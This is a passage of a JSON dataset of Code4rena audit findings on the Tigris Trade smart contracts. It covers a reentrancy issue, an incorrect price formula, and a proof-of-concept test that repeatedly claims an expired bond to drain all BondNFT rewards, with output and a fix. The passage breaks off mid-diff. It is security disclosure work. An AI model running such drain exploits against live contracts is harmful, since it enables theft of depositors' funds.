a lot more profit from it.\n\nso attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.\n\nthere can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nfollow the check-effect-interaction pattern.",
      "summary": "\nThis bug report is about a vulnerability in the Position contract of the 2022-12-tigris project. The code in question can be found at the given GitHub link. The vulnerability is caused by the lack of a check-effect-interaction pattern when using the mint() function. This allows an attacker to reenter the Trading contract logics and perform malicious actions, such as removing other users’ limit orders or stealing funds from the contract or users. The proof of concept provided in the report includes code from the mint() function, as well as two scenarios in which an attacker can exploit the vulnerability. The recommended mitigation step is to follow the check-effect-interaction pattern.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/400",
      "tags": [],
      "finders": [
        "hihen",
        "rotcivegaf",
        "debo",
        "0xsomeone",
        "wait",
        "KingNFT",
        "stealthyz",
        "unforgiven",
        "mookimgo"
      ]
    },
    {
      "id": "6325",
      "title": "[H-06] Incorrect calculation of new price while adding position",
      "impact": "HIGH",
      "content": "\nThe formula used for calculating `_newPrice` in `addToPosition()` function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.\n\nThe wrong formula\n\n    uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n\nThe correct formula is\n\n    uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);\n\nWhy this works?\n\nGiven\n\n    P1 = _trade.price\n    P2 = _price\n    P = _newPrice\n    M1 = _trade.margin\n    M2 = _addMargin\n    M =  M1 + M2 = _newMargin\n    L = _trade.leverage\n    U1 = M1 * L  = old position in USD\n    U2 = M2 * L = new position in USD\n    U = U1 + U2 = total position in USD\n    E1 = U1 / P1 = old position of base asset, such as ETH, of the pair\n    E2 = U2 / P2 = new position of base asset of the pair\n    E = E1 + E2 = total position of base asset of the pair\n\nThen\n\n    P = U / E\n      = (U1 + U2) / (E1 + E2)\n      = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)\n      = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)\n      = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)\n      = P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]\n      = P1 * P2 * M / (M1 * P2 + M2 * P1)\n\nproven.\n\n### Proof of Concept\n\nThe following test case shows two examples that users lose some funds due to adding a new position whenever their existing position is in profit or loss state.\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Incorrect calculation of new margin price while adding position\", function () {\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {\n    let orderId;\n    let initPrice = parseEther(\"1000\");\n    beforeEach(async function () {\n      // To simpliy the problem, set fees to 0\n      await trading.setFees(true, 0, 0, 0, 0, 0);\n      await trading.setFees(false, 0, 0, 0, 0, 0);\n\n      let TradeInfo = [parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\n      expect(trade.price.eq(parseEther('1000'))).to.be.true;\n      expect(trade.leverage.eq(parseEther('2'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\", async function () {\n      // The price increases from $1000 to $2000, the old position earns $1000 profit.\n      // The expected PnL payout = old margin + earned profit + new margin\n      //                         = $500 + $1000 + $500\n      //                         = $2000\n      let addingPrice = parseEther('2000');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('1666'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('1667'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\", async function () {\n      // The price decreases from $1000 to $750, the old position losses $250.\n      // The expected PnL payout = old margin - loss + new margin\n      //                         = $500 - $250 + $500\n      //                         = $750\n      let addingPrice = parseEther('750');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('714'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('715'))).to.be.true;\n    });\n\n  });\n});\n\n```\n\nThe test result\n\n    Incorrect calculation of new margin price while adding position\n        Initial margin $500, leverage 2x, position $1000, price $1000\n          √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\n          √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nUse the correct formula, the following test case is for the same above examples after fix.\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Correct calculation of new margin price while adding position\", function () {\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {\n    let orderId;\n    let initPrice = parseEther(\"1000\");\n    beforeEach(async function () {\n      // To simpliy the problem, set fees to 0\n      await trading.setFees(true, 0, 0, 0, 0, 0);\n      await trading.setFees(false, 0, 0, 0, 0, 0);\n\n      let TradeInfo = [parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\n      expect(trade.price.eq(parseEther('1000'))).to.be.true;\n      expect(trade.leverage.eq(parseEther('2'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\", async function () {\n      // The price increases from $1000 to $2000, the old position earns $1000 profit.\n      // The expected PnL payout = old margin + earned profit + new margin\n      //                         = $500 + $1000 + $500\n      //                         = $2000\n      let addingPrice = parseEther('2000');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('2000'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\", async function () {\n      // The price decreases from $1000 to $750, the old position losses $250.\n      // The expected PnL payout = old margin - loss + new margin\n      //                         = $500 - $250 + $500\n      //                         = $750\n      let addingPrice = parseEther('750');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('750'))).to.be.true;\n    });\n\n  });\n});\n\n```\n\nThe test result\n\n    Correct calculation of new margin price while adding position\n        Initial margin $500, leverage 2x, position $1000, price $1000\n          √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\n          √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1375841573)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1384495437):**\n > The warden has shown how, using `addToPosition` can cause the payout math to become incorrect, because this highlights an issue with the math of the protocol, which will impact its functionality, I believe High Severity to be appropriate.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1407511530):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174986 \n\n\n\n***\n\n",
      "summary": "\nA bug report has been issued regarding the calculation of the '_newPrice' in the 'addToPosition()' function of the 'Trading.sol' contract. It has been found that the formula used is incorrect and users will lose part of their funds/profit while using this function. The wrong formula is as follows: \n\n```\nuint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n```\n\nThe correct formula is as follows:\n\n```\nuint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);\n```\n\nThe impact of this bug is that users will not receive the expected PnL payout when they add a new position, as the formula used is incorrect. The proof of concept is given in the form of a test case, which shows two examples where users lose some funds due to adding a new position when their existing position is in either a profit or loss state. The tools used to detect this bug are 'hardhat'. The recommended mitigation steps are to use the correct formula, which is provided in the report. The test case for the same examples after the fix is also provided.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/236",
      "tags": [],
      "finders": [
        "KingNFT"
      ]
    },
    {
      "id": "6324",
      "title": "[H-05] Malicious user can steal all assets in BondNFT",
      "impact": "HIGH",
      "content": "\nMalicious user can drain all assets in BondNFT, and other users will lose their rewards.\n\n### Proof of Concept\n\nWhen calling [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate `accRewardsPerShare`. This is because the reward after the `expireEpoch` does not belong to that expired bond and needs to be redistributed to all other bonds.\n\n```solidity\n  if (bond.expired) {\n      uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n      if (totalShares[bond.asset] > 0) {\n          accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n      }\n  }\n```\n\nIn the current implementation of [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.\n\nAccording to the formula in the above code, we can find that although each subsequent `claim()` of the expired bond will transfer 0 reward, the `accRewardsPerShare` will be updated cumulatively.\nThus, the pending rewards of all other users will increase every time the expired bond is `claim()`ed.\n\nA malicious user can exploit this vulnerability to steal all assets in BondNFT contract:\n\n1.  Create two bonds (B1, B2) with different `expireEpoch`\n2.  At some time after B1 has expired (B2 has not), keep calling [`Lock.claim(B1)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.\n3.  Call [`Lock.claim(B2)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.\n\nAn example of such an attack:\n\n```javascript\ndiff --git a/test/09.Bonds.js b/test/09.Bonds.js\nindex 16c3ff5..7c445c3 100644\n--- a/test/09.Bonds.js\n+++ b/test/09.Bonds.js\n@@ -245,7 +245,90 @@ describe(\"Bonds\", function () {\n       await lock.connect(user).release(2);\n       expect(await bond.pending(1)).to.be.equals(\"999999999999999999725\"); // Negligable difference from 1000e18 due to solidity division\n     });\n+\n+    it.only(\"Drain BondNFT rewards\", async function () {\n+      const getState = async () => {\n+        const balHacker= await stabletoken.balanceOf(hacker.address);\n+        const balLock = await stabletoken.balanceOf(lock.address);\n+        const balBond = await stabletoken.balanceOf(bond.address);\n+        const [pending1, pending2, pending3] = [await bond.pending(1), await bond.pending(2), await bond.pending(3)];\n+        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3};\n+      };\n+      const parseEther = (v) => ethers.utils.parseEther(v.toString());\n+      const gwei = parseEther(1).div(1e9);\n+\n+      // prepare tokens\n+      const TotalRewards = parseEther(8000);\n+      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards);\n+      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000));\n+      const hacker = rndAddress;\n+      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700));\n+      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000));\n+\n+      // bond1 - user\n+      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100);\n+      await bond.distribute(stabletoken.address, parseEther(3800));\n+      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei);\n+      // Skip some time\n+      await network.provider.send(\"evm_increaseTime\", [20*86400]);\n+      await network.provider.send(\"evm_mine\");\n+\n+      // bond2 - hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10);\n+      // bond3 - hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100);\n+\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // Skip 10+ days, bond2 is expired\n+      await network.provider.send(\"evm_increaseTime\", [13*86400]);\n+      await network.provider.send(\"evm_mine\");\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // check balances before hack\n+      let st = await getState();\n+      expect(st.bond).to.be.equals(TotalRewards);\n+      expect(st.lock).to.be.equals(parseEther(3000));\n+      expect(st.hacker).to.be.equals(parseEther(0+700));\n+      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei);\n+      expect(st.pending2).to.be.closeTo(parseEther(100), gwei);\n+      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei);\n+\n+      // first claim of expired bond2\n+      await lock.connect(hacker).claim(2);\n+      st = await getState();\n+      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei);\n+      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei);\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(parseEther(0));\n+      expect(st.pending3).to.be.gt(parseEther(1000+1000));\n+\n+      // hack\n+      const remainReward = st.bond;\n+      let pending3 = st.pending3;\n+      let i = 0;\n+      for (; remainReward.gt(pending3); i++) {\n+        // claim expired bond2 repeatedly\n+        await lock.connect(hacker).claim(2);\n+        // pending3 keeps increasing\n+        pending3 = await bond.pending(3);\n+      }\n+      console.log(`claim count: ${i}\\nremain: ${ethers.utils.formatEther(remainReward)}\\npending3: ${ethers.utils.formatEther(pending3)}\\n`);\n+\n+      // send diff, then drain rewards in bond\n+      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward));\n+      await lock.connect(hacker).claim(3);\n+      st = await getState();\n+      // !! bond is drained !!\n+      expect(st.bond).to.be.eq(0);\n+      // !! hacker gets all rewards !!\n+      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(0);\n+      expect(st.pending3).to.be.eq(0);\n+    });\n   });\n+\n   describe(\"Withdrawing\", function () {\n     it(\"Only expired bonds can be withdrawn\", async function () {\n       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"100\"));\n```\n\nOutput:\n\n```\n  Bonds\n    Rewards\nclaim count: 41\nremain: 7900.000000000000000002\npending3: 8055.7342616570405578\n\n      ✓ Drain BondNFT rewards\n\n  1 passing (4s)\n\n```\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nI recommend that an expired bond should be forced to `release()`, `claim()` an expired bond should revert.\n\nSample code:\n\n```solidity\n\ndiff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol\nindex 33a6e76..77e85ae 100644\n--- a/contracts/BondNFT.sol\n+++ b/contracts/BondNFT.sol\n@@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         amount = bond.amount;\n         unchecked {\n             totalShares[bond.asset] -= bond.shares;\n-            (uint256 _claimAmount,) = claim(_id, bond.owner);\n+            (uint256 _claimAmount,) = _claim(_id, bond.owner);\n             amount += _claimAmount;\n         }\n         asset = bond.asset;\n@@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         _burn(_id);\n         emit Release(asset, lockAmount, _owner, _id);\n     }\n+\n     /**\n-     * @notice Claim rewards from a bond\n+     * @notice Claim rewards from an unexpired bond\n      * @dev Should only be called by a manager contract\n      * @param _id ID of the bond to claim rewards from\n      * @param _claimer address claiming rewards\n@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {\n     function claim(\n         uint _id,\n         address _claimer\n+    ) public onlyManager() returns(uint amount, address tigAsset) {\n+        Bond memory bond = idToBond(_id);\n+        require(!bond.expired, \"expired\");\n+        return _claim(_id, _claimer);\n+    }\n+\n+    /**\n+     * @notice Claim rewards from a releasing bond or an unexpired bond\n+     * @param _id ID of the bond to claim rewards from\n+     * @param _claimer address claiming rewards\n+     * @return amount amount of tigAsset claimed\n+     * @return tigAsset tigAsset token address\n+     */\n+    function _claim(\n+        uint _id,\n+        address _claimer\n     ) public onlyManager() returns(uint amount, address tigAsset) {\n         Bond memory bond = idToBond(_id);\n         require(_claimer == bond.owner, \"!owner\");\n```\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/170)**\n \n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1383192458):**\n > The warden has shown how, due to an inconsistent implementation of Bond State change, how they could repeatedly claim rewards for an expired bond, stealing value from all other depositors.\n> \n> Because the findings doesn't just deny yield to others, but allows a single attacker to seize the majority of the yield rewards, leveraging a broken invariant, I agree with High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1407494699):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the BondNFT contract code that allows a malicious user to drain all assets from the contract. The vulnerability lies in the fact that when calling the BondNFT.claim() method for an expired bond, it will recalculate the accRewardsPerShare, which can be exploited by a malicious user to steal all of the assets in the contract. \n\nThe malicious user can exploit this vulnerability by first creating two bonds (B1 and B2) with different expireEpochs, and then repeatedly calling the Lock.claim(B1) method to increase the rewards of B2 until the pending rewards of B2 approaches the total amount of assets in the contract. The malicious user can then call the Lock.claim(B2) method to claim all of the pending rewards of B2 and drain all of the assets in the BondNFT contract.\n\nThe recommended mitigation steps for this vulnerability are to force an expired bond to release, and to make the claim() method for an expired bond revert. This can be achieved by adding the following code to the BondNFT.sol contract: \n\n```solidity\ndiff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol\nindex 33a6e76..77e85ae 100644\n--- a/contracts/BondNFT.sol\n+++ b/contracts/BondNFT.sol\n@@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         amount = bond.amount;\n         unchecked {\n             totalShares[bond.asset] -= bond.shares;\n-            (uint256 _claimAmount,) = claim(_id, bond.owner);\n+            (uint256 _claimAmount,) = _claim(_id, bond.owner);\n             amount += _claimAmount;\n         }\n         asset = bond.asset;\n@@ -157,8 